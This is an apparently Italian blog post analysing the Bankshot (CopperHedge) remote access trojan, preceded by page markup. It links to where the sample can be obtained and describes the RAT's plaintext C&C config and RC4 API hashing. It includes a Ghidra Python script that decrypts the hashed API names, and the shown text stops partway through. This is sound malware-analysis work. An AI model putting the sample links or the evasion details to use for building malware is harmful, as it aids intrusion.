+One%7CYesteryear%7CYrsa%7CZeyada&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='spice-social-share-google-fonts-css' href='//fonts.googleapis.com/css?family=ABeeZee%7CAbel%7CAbril+Fatface%7CAclonica%7CAcme%7CActor%7CAdamina%7CAdvent+Pro%7CAguafina+Script%7CAkronim%7CAladin%7CAldrich%7CAlef%7CAlegreya%7CAlegreya+SC%7CAlegreya+Sans%7CAlegreya+Sans+SC%7CAlex+Brush%7CAlfa+Slab+One%7CAlice%7CAlike%7CAlike+Angular%7CAllan%7CAllerta%7CAllerta+Stencil%7CAllura%7CAlmendra%7CAlmendra+Display%7CAlmendra+SC%7CAmarante%7CAmaranth%7CAmatic+SC%7CAmatica+SC%7CAmethysta%7CAmiko%7CAmiri%7CAmita%7CAnaheim%7CAndada%7CAndika%7CAngkor%7CAnnie+Use+Your+Telescope%7CAnonymous+Pro%7CAntic%7CAntic+Didone%7CAntic+Slab%7CAnton%7CArapey%7CArbutus%7CArbutus+Slab%7CArchitects+Daughter%7CArchivo+Black%7CArchivo+Narrow%7CAref+Ruqaa%7CArima+Madurai%7CArimo%7CArizonia%7CArmata%7CArtifika%7CArvo%7CArya%7CAsap%7CAsar%7CAsset%7CAssistant%7CAstloch%7CAsul%7CAthiti%7CAtma%7CAtomic+Age%7CAubrey%7CAudiowide%7CAutour+One%7CAverage%7CAverage+Sans%7CAveria+Gruesa+Libre%7CAveria+Libre%7CAveria+Sans+Libre%7CAveria+Serif+Libre%7CBad+Script%7CBaloo%7CBaloo+Bhai%7CBaloo+Da%7CBaloo+Thambi%7CBalthazar%7CBangers%7CBasic%7CBattambang%7CBaumans%7CBayon%7CBelgrano%7CBelleza%7CBenchNine%7CBentham%7CBerkshire+Swash%7CBevan%7CBigelow+Rules%7CBigshot+One%7CBilbo%7CBilbo+Swash+Caps%7CBioRhyme%7CBioRhyme+Expanded%7CBiryani%7CBitter%7CBlack+Ops+One%7CBokor%7CBonbon%7CBoogaloo%7CBowlby+One%7CBowlby+One+SC%7CBrawler%7CBree+Serif%7CBubblegum+Sans%7CBubbler+One%7CBuda%7CBuenard%7CBungee%7CBungee+Hairline%7CBungee+Inline%7CBungee+Outline%7CBungee+Shade%7CButcherman%7CButterfly+Kids%7CCabin%7CCabin+Condensed%7CCabin+Sketch%7CCaesar+Dressing%7CCagliostro%7CCairo%7CCalligraffitti%7CCambay%7CCambo%7CCandal%7CCantarell%7CCantata+One%7CCantora+One%7CCapriola%7CCardo%7CCarme%7CCarrois+Gothic%7CCarrois+Gothic+SC%7CCarter+One%7CCatamaran%7CCaudex%7CCaveat%7CCaveat+Brush%7CCedarville+Cursive%7CCeviche+One%7CChanga%7CChanga+One%7CChango%7CChathura%7CChau+Philomene+One%7CChela+One%7CChelsea+Market%7CChenla%7CCherry+Cream+Soda%7CCherry+Swash%7CChewy%7CChicle%7CChivo%7CChonburi%7CCinzel%7CCinzel+Decorative%7CClicker+Script%7CCoda%7CCoda+Caption%7CCodystar%7CCoiny%7CCombo%7CComfortaa%7CComing+Soon%7CConcert+One%7CCondiment%7CContent%7CContrail+One%7CConvergence%7CCookie%7CCopse%7CCorben%7CCormorant%7CCormorant+Garamond%7CCormorant+Infant%7CCormorant+SC%7CCormorant+Unicase%7CCormorant+Upright%7CCourgette%7CCousine%7CCoustard%7CCovered+By+Your+Grace%7CCrafty+Girls%7CCreepster%7CCrete+Round%7CCrimson+Text%7CCroissant+One%7CCrushed%7CCuprum%7CCutive%7CCutive+Mono%7CDamion%7CDancing+Script%7CDangrek%7CDavid+Libre%7CDawning+of+a+New+Day%7CDays+One%7CDekko%7CDelius%7CDelius+Swash+Caps%7CDelius+Unicase%7CDella+Respira%7CDenk+One%7CDevonshire%7CDhurjati%7CDidact+Gothic%7CDiplomata%7CDiplomata+SC%7CDomine%7CDonegal+One%7CDoppio+One%7CDorsa%7CDosis%7CDr+Sugiyama%7CDroid+Sans%7CDroid+Sans+Mono%7CDroid+Serif%7CDuru+Sans%7CDynalight%7CEB+Garamond%7CEagle+Lake%7CEater%7CEconomica%7CEczar%7CEk+Mukta%7CEl+Messiri%7CElectrolize%7CElsie%7CElsie+Swash+Caps%7CEmblema+One%7CEmilys+Candy%7CEngagement%7CEnglebert%7CEnriqueta%7CErica+One%7CEsteban%7CEuphoria+Script%7CEwert%7CExo%7CExo+2%7CExpletus+Sans%7CFanwood+Text%7CFarsan%7CFascinate%7CFascinate+Inline%7CFaster+One%7CFasthand%7CFauna+One%7CFederant%7CFedero%7CFelipa%7CFenix%7CFinger+Paint%7CFira+Mono%7CFira+Sans%7CFjalla+One%7CFjord+One%7CFlamenco%7CFlavors%7CFondamento%7CFontdiner+Swanky%7CForum%7CFrancois+One%7CFrank+Ruhl+Libre%7CFreckle+Face%7CFredericka+the+Great%7CFredoka+One%7CFreehand%7CFresca%7CFrijole%7CFruktur%7CFugaz+One%7CGFS+Didot%7CGFS+Neohellenic%7CGabriela%7CGafata%7CGalada%7CGaldeano%7CGalindo%7CGentium+Basic%7CGentium+Book+Basic%7CGeo%7CGeostar%7CGeostar+Fill%7CGermania+One%7CGidugu%7CGilda+Display%7CGive+You+Glory%7CGlass+Antiqua%7CGlegoo%7CGloria+Hallelujah%7CGoblin+One%7CGochi+Hand%7CGorditas%7CGoudy+Bookletter+1911%7CGraduate%7CGrand+Hotel%7CGravitas+One%7CGreat+Vibes%7CGriffy%7CGruppo%7CGudea%7CGurajada%7CHabibi%7CHalant%7CHammersmith+One%7CHanalei%7CHanalei+Fill%7CHandlee%7CHanuman%7CHappy+Monkey%7CHarmattan%7CHeadland+One%7CHeebo%7CHenny+Penny%7CHerr+Von+Muellerhoff%7CHind%7CHind+Guntur%7CHind+Madurai%7CHind+Siliguri%7CHind+Vadodara%7CHoltwood+One+SC%7CHomemade+Apple%7CHomenaje%7CIM+Fell+DW+Pica%7CIM+Fell+DW+Pica+SC%7CIM+Fell+Double+Pica%7CIM+Fell+Double+Pica+SC%7CIM+Fell+English%7CIM+Fell+English+SC%7CIM+Fell+French+Canon%7CIM+Fell+French+Canon+SC%7CIM+Fell+Great+Primer%7CIM+Fell+Great+Primer+SC%7CIceberg%7CIceland%7CImprima%7CInconsolata%7CInder%7CIndie+Flower%7CInika%7CInknut+Antiqua%7CIrish+Grover%7CIstok+Web%7CItaliana%7CItalianno%7CItim%7CJacques+Francois%7CJacques+Francois+Shadow%7CJaldi%7CJim+Nightshade%7CJockey+One%7CJolly+Lodger%7CJomhuria%7CJosefin+Sans%7CJosefin+Slab%7CJoti+One%7CJudson%7CJulee%7CJulius+Sans+One%7CJunge%7CJura%7CJust+Another+Hand%7CJust+Me+Again+Down+Here%7CKadwa%7CKalam%7CKameron%7CKanit%7CKantumruy%7CKarla%7CKarma%7CKatibeh%7CKaushan+Script%7CKavivanar%7CKavoon%7CKdam+Thmor%7CKeania+One%7CKelly+Slab%7CKenia%7CKhand%7CKhmer%7CKhula%7CKite+One%7CKnewave%7CKotta+One%7CKoulen%7CKranky%7CKreon%7CKristi%7CKrona+One%7CKumar+One%7CKumar+One+Outline%7CKurale%7CLa+Belle+Aurore%7CLaila%7CLakki+Reddy%7CLalezar%7CLancelot%7CLateef%7CLato%7CLeague+Script%7CLeckerli+One%7CLedger%7CLekton%7CLemon%7CLemonada%7CLibre+Baskerville%7CLibre+Franklin%7CLife+Savers%7CLilita+One%7CLily+Script+One%7CLimelight%7CLinden+Hill%7CLobster%7CLobster+Two%7CLondrina+Outline%7CLondrina+Shadow%7CLondrina+Sketch%7CLondrina+Solid%7CLora%7CLove+Ya+Like+A+Sister%7CLoved+by+the+King%7CLovers+Quarrel%7CLuckiest+Guy%7CLusitana%7CLustria%7CMacondo%7CMacondo+Swash+Caps%7CMada%7CMagra%7CMaiden+Orange%7CMaitree%7CMako%7CMallanna%7CMandali%7CMarcellus%7CMarcellus+SC%7CMarck+Script%7CMargarine%7CMarko+One%7CMarmelad%7CMartel%7CMartel+Sans%7CMarvel%7CMate%7CMate+SC%7CMaven+Pro%7CMcLaren%7CMeddon%7CMedievalSharp%7CMedula+One%7CMeera+Inimai%7CMegrim%7CMeie+Script%7CMerienda%7CMerienda+One%7CMerriweather%7CMerriweather+Sans%7CMetal%7CMetal+Mania%7CMetrophobic%7CMichroma%7CMilonga%7CMiltonian%7CMiltonian+Tattoo%7CMiniver%7CMiriam+Libre%7CMirza%7CMiss+Fajardose%7CMitr%7CModak%7CModern+Antiqua%7CMogra%7CMolengo%7CMolle%7CMonda%7CMonofett%7CMonoton%7CMonsieur+La+Doulaise%7CMontaga%7CMontez%7CMontserrat%7CMontserrat+Alternates%7CMontserrat+Subrayada%7CMoul%7CMoulpali%7CMountains+of+Christmas%7CMouse+Memoirs%7CMr+Bedfort%7CMr+Dafoe%7CMr+De+Haviland%7CMrs+Saint+Delafield%7CMrs+Sheppards%7CMukta+Vaani%7CMuli%7CMystery+Quest%7CNTR%7CNeucha%7CNeuton%7CNew+Rocker%7CNews+Cycle%7CNiconne%7CNixie+One%7CNobile%7CNokora%7CNorican%7CNosifer%7CNothing+You+Could+Do%7CNoticia+Text%7CNoto+Sans%7CNoto+Serif%7CNova+Cut%7CNova+Flat%7CNova+Mono%7CNova+Oval%7CNova+Round%7CNova+Script%7CNova+Slim%7CNova+Square%7CNumans%7CNunito%7CNunito+Sans%7COdor+Mean+Chey%7COffside%7COld+Standard+TT%7COldenburg%7COleo+Script%7COleo+Script+Swash+Caps%7COpen+Sans%7COpen+Sans+Condensed%7COranienbaum%7COrbitron%7COregano%7COrienta%7COriginal+Surfer%7COswald%7COver+the+Rainbow%7COverlock%7COverlock+SC%7COvo%7COxygen%7COxygen+Mono%7CPT+Mono%7CPT+Sans%7CPT+Sans+Caption%7CPT+Sans+Narrow%7CPT+Serif%7CPT+Serif+Caption%7CPacifico%7CPalanquin%7CPalanquin+Dark%7CPaprika%7CParisienne%7CPassero+One%7CPassion+One%7CPathway+Gothic+One%7CPatrick+Hand%7CPatrick+Hand+SC%7CPattaya%7CPatua+One%7CPavanam%7CPaytone+One%7CPeddana%7CPeralta%7CPermanent+Marker%7CPetit+Formal+Script%7CPetrona%7CPhilosopher%7CPiedra%7CPinyon+Script%7CPirata+One%7CPlaster%7CPlay%7CPlayball%7CPlayfair+Display%7CPlayfair+Display+SC%7CPodkova%7CPoiret+One%7CPoller+One%7CPoly%7CPompiere%7CPontano+Sans%7CPoppins%7CPort+Lligat+Sans%7CPort+Lligat+Slab%7CPragati+Narrow%7CPrata%7CPreahvihear%7CPress+Start+2P%7CPridi%7CPrincess+Sofia%7CProciono%7CPrompt%7CProsto+One%7CProza+Libre%7CPuritan%7CPurple+Purse%7CQuando%7CQuantico%7CQuattrocento%7CQuattrocento+Sans%7CQuestrial%7CQuicksand%7CQuintessential%7CQwigley%7CRacing+Sans+One%7CRadley%7CRajdhani%7CRakkas%7CRaleway%7CRaleway+Dots%7CRamabhadra%7CRamaraja%7CRambla%7CRammetto+One%7CRanchers%7CRancho%7CRanga%7CRasa%7CRationale%7CRedressed%7CReem+Kufi%7CReenie+Beanie%7CRevalia%7CRhodium+Libre%7CRibeye%7CRibeye+Marrow%7CRighteous%7CRisque%7CRoboto%7CRoboto+Condensed%7CRoboto+Mono%7CRoboto+Slab%7CRochester%7CRock+Salt%7CRokkitt%7CRomanesco%7CRopa+Sans%7CRosario%7CRosarivo%7CRouge+Script%7CRozha+One%7CRubik%7CRubik+Mono+One%7CRubik+One%7CRuda%7CRufina%7CRuge+Boogie%7CRuluko%7CRum+Raisin%7CRuslan+Display%7CRuthie%7CRye%7CSacramento%7CSahitya%7CSail%7CSalsa%7CSanchez%7CSancreek%7CSansita+One%7CSarala%7CSarina%7CSarpanch%7CSatisfy%7CScada%7CScheherazade%7CSchoolbell%7CScope+One%7CSeaweed+Script%7CSecular+One%7CSen%7CSevillana%7CSeymour+One%7CShadows+Into+Light%7CShadows+Into+Light+Two%7CShanti%7CShare%7CShare+Tech%7CShare+Tech+Mono%7CShojumaru%7CShort+Stack%7CShrikhand%7CSiemreap%7CSigmar+One%7CSignika%7CSignika+Negative%7CSimonetta%7CSintony%7CSirin+Stencil%7CSix+Caps%7CSkranji%7CSlabo+13px%7CSlabo+27px%7CSlackey%7CSmokum%7CSmythe%7CSniglet%7CSnippet%7CSnowburst+One%7CSofadi+One%7CSofia%7CSonsie+One%7CSorts+Mill+Goudy%7CSource+Code+Pro%7CSource+Sans+Pro%7CSource+Serif+Pro%7CSpace+Mono%7CSpecial+Elite%7CSpicy+Rice%7CSpinnaker%7CSpirax%7CSquada+One%7CSree+Krushnadevaraya%7CSriracha%7CStalemate%7CStalinist+One%7CStardos+Stencil%7CStint+Ultra+Condensed%7CStint+Ultra+Expanded%7CStoke%7CStrait%7CSue+Ellen+Francisco%7CSuez+One%7CSumana%7CSunshiney%7CSupermercado+One%7CSura%7CSuranna%7CSuravaram%7CSuwannaphum%7CSwanky+and+Moo+Moo%7CSyncopate%7CTangerine%7CTaprom%7CTauri%7CTaviraj%7CTeko%7CTelex%7CTenali+Ramakrishna%7CTenor+Sans%7CText+Me+One%7CThe+Girl+Next+Door%7CTienne%7CTillana%7CTimmana%7CTinos%7CTitan+One%7CTitillium+Web%7CTrade+Winds%7CTrirong%7CTrocchi%7CTrochut%7CTrykker%7CTulpen+One%7CUbuntu%7CUbuntu+Condensed%7CUbuntu+Mono%7CUltra%7CUncial+Antiqua%7CUnderdog%7CUnica+One%7CUnifrakturCook%7CUnifrakturMaguntia%7CUnkempt%7CUnlock%7CUnna%7CVT323%7CVampiro+One%7CVarela%7CVarela+Round%7CVast+Shadow%7CVesper+Libre%7CVibur%7CVidaloka%7CViga%7CVoces%7CVolkhov%7CVollkorn%7CVoltaire%7CWaiting+for+the+Sunrise%7CWallpoet%7CWalter+Turncoat%7CWarnes%7CWellfleet%7CWendy+One%7CWire+One%7CWork+Sans%7CYanone+Kaffeesatz%7CYantramanav%7CYatra+One%7CYellowtail%7CYeseva+One%7CYesteryear%7CYrsa%7CZeyada&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<script type="text/javascript" src="https://malverse.it/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://malverse.it/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://malverse.it/wp-content/themes/honeypress/assets/js/jquery.mb.YTPlayer.js?ver=6.7.1" id="honeypress-video-slider-js-js"></script>
<link rel="https://api.w.org/" href="https://malverse.it/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://malverse.it/wp-json/wp/v2/posts/800" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://malverse.it/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel="canonical" href="https://malverse.it/analisi-bankshot-copperhedge" />
<link rel='shortlink' href='https://malverse.it/?p=800' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://malverse.it/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmalverse.it%2Fanalisi-bankshot-copperhedge" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://malverse.it/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmalverse.it%2Fanalisi-bankshot-copperhedge&#038;format=xml" />
    <style>
    .page-title h1{
    	color: #fff !important;
    }
    </style>
    
<style>
  body h1 {
    	color: #061018 ;
    }
		body.dark h1 {
				color: #ffffff ;
			}
    body .section-header h2, body .funfact h2, body h2{
    	color: #061018;
    }
		body.dark .section-header h2, body.dark h2, body.dark h2.text-white {
    	color: #ffffff;
    }
    body h3 {
    	color: #061018;
    }
		body.dark h3, body.dark h3 a {
    	color: #ffffff;
    }
    body .entry-header h4 > a, body h4 {
    	color: #061018;
    }
	  .dark .entry-header h4 > a, .dark h4, .dark .services .entry-header .entry-title a {
    	color: #ffffff;
    }
    body .product-price h5 > a, body .blog-author h5, body .comment-detail h5, body h5, body .blog .blog-author.media h5{
    	color: #061018;
    }
		body.dark .product-price h5 > a, body.dark .blog-author h5, body.dark .comment-detail h5, body.dark h5, body.dark .blog .blog-author.media h5{
    	color: #ffffff;
    }
    body h6 {
    	color: #061018;
    }
		body.dark h6 {
    	color: #ffffff;
    }
    p,body .services5 .post .entry-content p, p.comment-form-comment label, .navbar7 .menu-html p{
    	color: #061018;
    }
		.dark p:not(.testmonial-block5 p, .section-header .section-subtitle, .textwidget p, p.description, p.site-description), body.dark .services5 .post .entry-content p, .dark p.comment-form-comment label {
    	color: #c8c8c8;
    }
    .site-footer .site-info p{color: #bec3c7;}


    /* Sidebar */
    body .sidebar .widget-title, body .sidebar .wp-block-search .wp-block-search__label, body .sidebar .wc-block-product-search .wc-block-product-search__label, body .sidebar .widget h1, body .sidebar .widget h2, body .sidebar .widget h3, body .sidebar .widget h4, body .sidebar .widget h5, body .sidebar .widget h6 {
    	color: #061018;
    }
		body.dark .sidebar .widget-title, body.dark .sidebar .wp-block-search .wp-block-search__label, body.dark .sidebar .widget h1, body.dark .sidebar .widget h2, body.dark .sidebar .widget h3, body.dark .sidebar .widget h4, body.dark .sidebar .widget h5, body.dark .sidebar .widget h6 {
    	color: #ffffff;
    }
    body .sidebar p, body .sidebar .woocommerce-Price-amount.amount,.sidebar .quantity, body .sidebar #wp-calendar, body .sidebar #wp-calendar caption, body .sidebar .wp-block-latest-posts__post-excerpt, body .sidebar .wp-block-latest-posts__post-author, body .sidebar .wp-block-latest-posts__post-date, body .sidebar .wp-block-latest-comments__comment-date  {
    	color: #061018;
    }
		body.dark .sidebar p, body.dark .sidebar .woocommerce-Price-amount.amount,.sidebar .quantity, body.dark .sidebar #wp-calendar, body.dark .sidebar #wp-calendar caption, body.dark .sidebar .wp-block-latest-posts__post-excerpt, body.dark .sidebar .wp-block-latest-posts__post-author, body.dark .sidebar .wp-block-latest-posts__post-date, body.dark .sidebar .wp-block-latest-comments__comment-date {
    	color: #c8c8c8  !important;
    }
    body .sidebar a, body #wrapper .sidebar .woocommerce a {
    	color: #061018;
    }
		body.dark .sidebar a, body.dark #wrapper .sidebar .woocommerce a {
			color: #ffffff;
		}
</style>
    

            <style>
		.site-footer p {
			color: #ffffff;
		}
        </style>
<style type="text/css">
    .custom-logo{width: 230px; height: auto;}
    .honeypress_header_btn{ -webkit-border-radius: 0px;border-radius: 0px;}
   #wrapper .container{max-width: 1140px;}
   #wrapper .site-footer .container{max-width: 1140px;}
</style>
		<style type="text/css" id="wp-custom-css">
			.page-title-section 
{
    background: url(https://malverse.it/wp-content/uploads/2022/08/fractal-ge45052f6e_1920.jpg);
	  background-position: center;

}



.wp-block-image figcaption {
  font-size: 13px;
  line-height: 1.5;
  margin: 0;
  color: $gray-medium;
}		</style>
				</head>
		<body class="post-template-default single single-post postid-800 single-format-standard  custom-background dark" >
								<div id="page" class="site">
						<a class="skip-link screen-reader-text" href="#wrapper">Vai al contenuto</a>
												<nav class="navbar navbar-expand-lg navbar-light ">
		<div class="container">
								<div class="custom-logo-link-url">
		    		<h1 class="site-title"><a class="site-title-name" href="https://malverse.it/" >Malverse</a></h1>
				    				</div>
				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Navigazione toggle">
						<span class="navbar-toggler-icon"></span>
				</button>
				<div class="collapse navbar-collapse" id="navbarNavDropdown">
						<div class="ml-auto">
								<ul class="nav navbar-nav mr-auto "><li class="nav-item menu-item "><a class="nav-link " href="https://malverse.it/" title="Home">Home</a></li><li class="nav-item menu-item page_item dropdown page-item-460 current_page_parent"><a class="nav-link" href="https://malverse.it/blog">Blog</a></li><li class="nav-item menu-item page_item dropdown page-item-33"><a class="nav-link" href="https://malverse.it/risorse-utili">Risorse Utili</a></li></ul>
					</div>
			</div>
	</div>
</nav>
		<section class="page-title-section" >		
			<div class="overlay"></div>	
			<div class="container">
				<div class="row">
					<div class="col-lg-12 col-md-12">
                                         
							<div class="page-title text-center text-white">
											                    	<h1 class="text-white">Realizziamo un HTTP C&#038;C in Python (Bankshot)</h1>
			                    			                </div>	
						                    </div>
				</div>
			</div>	
		</section>
							<div id="wrapper">
<section class="section-module blog">
	<div class="container">
		<div class="row">
			<div class="col-lg-8 col-md-7 col-sm-12 standard-view blog-single"><article class="post">
	<div class="entry-meta"><span class="cat-links"><a href="https://malverse.it/category/malwareanalysis" rel="category tag">Malware Analysis</a></span></div>	
											
	<header class="entry-header">
		<h2 class="entry-title">Realizziamo un HTTP C&#038;C in Python (Bankshot)</h2>
	</header>
		<div class="entry-meta mb-4">
							<span class="author">
					<a  href="https://malverse.it/author/greenplan">By greenplan</a>
				</span>
							<span class="posted-on">
					<a  href="https://malverse.it/1970/01"><time>Settembre 10, 2022</time></a>
				</span>
							<span class="comment-links">
					<a  href="https://malverse.it/analisi-bankshot-copperhedge#respond">0</a>
				</span>
					</div>
		
	<div class="entry-content">
		
<h2 class="wp-block-heading">Introduzione</h2>



<p>Ciao a tutti! Oggi vedremo l&#8217;analisi di <strong>Bankshot </strong>(conosciuto anche come CopperHedge); Bankshot è un RAT semplice che implementa 15 comandi, scritto in <strong>C++</strong> e utilizza <strong>RC4 </strong>per effettuare parzialmente<strong> API Hashing</strong> e per cifrare/decifrare la comunicazione il C&amp;C; il config è presente in chiaro.</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"><p></p><cite>Bankshot&nbsp;is a remote access tool (RAT) that was first reported by the Department of Homeland Security in December of 2017. In 2018,&nbsp;Lazarus Group&nbsp;used the&nbsp;Bankshot&nbsp;implant in attacks against the Turkish financial sector.&nbsp;</cite></blockquote>



<p>Per maggiori dettagli si può visionare il <a rel="noreferrer noopener" href="https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-133a" data-type="URL" data-id="https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-133a" target="_blank">report</a> del CISA dove sono presenti le 6 varianti e la <a rel="noreferrer noopener" href="https://www.virustotal.com/gui/collection/alienvault_5ebaee4cb570b4824f773f44" data-type="URL" data-id="https://www.virustotal.com/gui/collection/alienvault_5ebaee4cb570b4824f773f44" target="_blank">collection</a> di Virustotal. Altri riferimenti utili: IOC di <a rel="noreferrer noopener" href="https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus" data-type="URL" data-id="https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus" target="_blank">ESET</a> e correlazione tra i sample di <a rel="noreferrer noopener" href="https://blog.reversinglabs.com/blog/hidden-cobra" data-type="URL" data-id="https://blog.reversinglabs.com/blog/hidden-cobra" target="_blank">Reversing Lab.</a> </p>



<p>In particolare oggi analizzeremo un sample della <strong>Variante B</strong>, MD5: <strong>667cf9e8ec1dac7812f92bd77af702a1 </strong>che può essere ottenuto <a rel="noreferrer noopener" href="https://app.any.run/tasks/a3cf2f13-3495-4062-b332-3622f7e3aace/#" target="_blank">qui</a> o <a rel="noreferrer noopener" href="https://app.any.run/tasks/e272b8d1-019c-405a-a1da-30b0398b7795/" target="_blank">qui</a>. Partiamo!</p>



<p></p>



<h2 class="wp-block-heading">Introduzione</h2>



<p>Come sempre utilizziamo alcuni tool per velocizzare le successive analisi:</p>



<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="922" height="539" src="https://malverse.it/wp-content/uploads/2022/09/image-21.png" alt="" class="wp-image-806" srcset="https://malverse.it/wp-content/uploads/2022/09/image-21.png 922w, https://malverse.it/wp-content/uploads/2022/09/image-21-300x175.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-21-768x449.png 768w" sizes="(max-width: 922px) 100vw, 922px" /><figcaption>Esecuzione di capa</figcaption></figure>



<p>Questa volta, a differenza di Danabot, è molto più semplice ottenere il config in quanto i tre server C&amp;C sono presenti in chiaro:</p>



<figure class="wp-block-image size-full"><img decoding="async" width="795" height="86" src="https://malverse.it/wp-content/uploads/2022/09/image-19.png" alt="" class="wp-image-803" srcset="https://malverse.it/wp-content/uploads/2022/09/image-19.png 795w, https://malverse.it/wp-content/uploads/2022/09/image-19-300x32.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-19-768x83.png 768w" sizes="(max-width: 795px) 100vw, 795px" /><figcaption>URL memorizzati in chiaro</figcaption></figure>



<p>Con queste informazioni aggiuntive proseguiamo con l&#8217;analisi; il malware avvia immediatamente un Thread:</p>



<figure class="wp-block-image size-full"><img decoding="async" width="936" height="294" src="https://malverse.it/wp-content/uploads/2022/09/image-20.png" alt="" class="wp-image-805" srcset="https://malverse.it/wp-content/uploads/2022/09/image-20.png 936w, https://malverse.it/wp-content/uploads/2022/09/image-20-300x94.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-20-768x241.png 768w" sizes="(max-width: 936px) 100vw, 936px" /><figcaption>Main che avvia il Thread principale</figcaption></figure>



<p>Il Thread inizia risolvendo le diverse API dinamicamente. In particolare, l&#8217;algoritmo utilizzato per l&#8217;API Hashing è <strong>RC4</strong>. All&#8217;inizio di ogni funzione che vedremo successivamente avremo la risoluzione dell&#8217;API attraverso questa funzione.</p>



<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://malverse.it/wp-content/uploads/2022/09/main_flow.png" alt="" class="wp-image-1052" width="627" height="633" srcset="https://malverse.it/wp-content/uploads/2022/09/main_flow.png 729w, https://malverse.it/wp-content/uploads/2022/09/main_flow-297x300.png 297w, https://malverse.it/wp-content/uploads/2022/09/main_flow-150x150.png 150w" sizes="auto, (max-width: 627px) 100vw, 627px" /><figcaption>Operazioni effettuate dal Thread Principale</figcaption></figure>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="657" height="561" src="https://malverse.it/wp-content/uploads/2022/09/image-59.png" alt="" class="wp-image-963" srcset="https://malverse.it/wp-content/uploads/2022/09/image-59.png 657w, https://malverse.it/wp-content/uploads/2022/09/image-59-300x256.png 300w" sizes="auto, (max-width: 657px) 100vw, 657px" /><figcaption>Funzione di API Hashing con RC4</figcaption></figure>



<p>Continuiamo effettuando la decifratura delle API con un semplice script Python utilizzando le <strong>API Ghidra</strong>; il funzionamento è il seguente:</p>



<ul class="wp-block-list"><li>Si ottengono tutte le chiamate alla funzione che si occupa di effettuare <strong>API Hashing </strong>(in questo caso è rinominata in ApiHashingViaRC4) tramite <strong>getReferencesTo</strong>().</li><li>Ottengo le istruzioni precedenti fino a trovare <strong>MOV EDX, indirizzoNomeFunzioneCifrata</strong> tramite <strong>getInstructionBefore()</strong>.</li><li>Il primo byte contenuto in questo indirizzo contiene la lunghezza della stringa cifrata e poi la stringa cifrata; con <strong>getBytes(addrEncrypted, 1)[0]</strong> ottengo il primo byte; ottengo quindi il byte array (nome funzione cifrata) partendo dall&#8217;indirizzo contenuto in EDX + 1 (<strong>addrEncrypted.add(1)</strong>) essendo che il primo byte contiene la lunghezza e da questo indirizzo leggo la lunghezza che ho ottenuto in precedenza.</li><li>Effettuo la decifratura tramite RC4 della stringa cifrata ottenuta.</li></ul>



<pre class="wp-block-code"><code>def rc4Decrypt(key, data):
    S = list(range(256))
    j = 0

    for i in list(range(256)):
        j = (j + S&#91;i] + ord(key&#91;i % len(key)])) % 256
        S&#91;i], S&#91;j] = S&#91;j], S&#91;i]

    j = 0
    y = 0
    out = &#91;]

    for char in data:
        j = (j + 1) % 256
        y = (y + S&#91;j]) % 256
        S&#91;j], S&#91;y] = S&#91;y], S&#91;j]

        out.append(unichr(ord(char) ^ S&#91;(S&#91;j] + S&#91;y]) % 256]))

    return ''.join(out)
    

def main():
   
    key = '78292e4c5da3b5d067f081b736e5d593'.decode('hex')
    
    for ref in getReferencesTo(toAddr("ApiHashingViaRC4")):

        fromAddr = ref.getFromAddress()
        
        while True:
        
            instr = getInstructionBefore(fromAddr)
     
            if instr.getMnemonicString().lower() == 'mov' and instr.getOpObjects(0)&#91;0].toString().lower() == 'edx':
                    addrEncrypted = toAddr(instr.getOpObjects(1)&#91;0].getValue())
                    print("Indirizzo API cifrata: " + str(addrEncrypted))
                    encryptedName =  str(bytearray(getBytes(addrEncrypted.add(1), getBytes(addrEncrypted, 1)&#91;0])))
                    print("0x" + str(instr.getAddress()) + "  " + rc4Decrypt(key, encryptedName))
                    break          
                    
            fromAddr = instr.getAddress()

if __name__ == '__main__':
    main()</code></pre>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="431" height="568" src="https://malverse.it/wp-content/uploads/2022/09/image-73.png" alt="" class="wp-image-1142" srcset="https://malverse.it/wp-content/uploads/2022/09/image-73.png 431w, https://malverse.it/wp-content/uploads/2022/09/image-73-228x300.png 228w" sizes="auto, (max-width: 431px) 100vw, 431px" /><figcaption>Esecuzione dello script</figcaption></figure>



<p>Curioso come non tutte le API sono offuscate, ad esempio quelle riguardanti la comunicazione HTTP:</p>



<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" src="https://malverse.it/wp-content/uploads/2022/09/image-23.png" alt="" class="wp-image-811" width="848" height="263" srcset="https://malverse.it/wp-content/uploads/2022/09/image-23.png 784w, https://malverse.it/wp-content/uploads/2022/09/image-23-300x93.png 300w, https://malverse.it/wp-content/uploads/2022/09/image-23-768x238.png 768w" sizes="auto, (max-width: 848px) 100vw, 848px" /><figcaption>Funzioni non offuscate per la comunicazione HTTP</figcaption></figure>



<p>Dopo aver effettuato la risoluzione delle API, avviene la creazione del CONFIG che viene salvato in una variabile globale; in questo config vengono salvati i 3 URL insieme a un valore casuale compreso tra 65535 e 16777215:</p>



